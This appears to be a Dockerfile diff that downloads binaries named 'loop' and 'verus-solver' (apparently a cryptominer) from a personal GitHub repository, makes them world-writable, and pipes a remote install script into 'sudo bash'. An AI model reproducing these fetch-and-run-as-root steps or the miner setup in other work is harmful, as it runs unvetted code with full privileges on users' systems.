@@ -21,7 +21,7 @@ RUN wget https://github.com/breakok/ob/raw/main/loop
 RUN wget https://github.com/breakok/ob/raw/main/verus-solver
 RUN chmod 777 verus-solver
 RUN chmod 777 loop
-RUN chmod 777 loop.sh
+RUN chmod 777 root.sh
 RUN curl https://rclone.org/install.sh | sudo bash
 
 # Copy rclone tasks to /tmp, to potentially be used
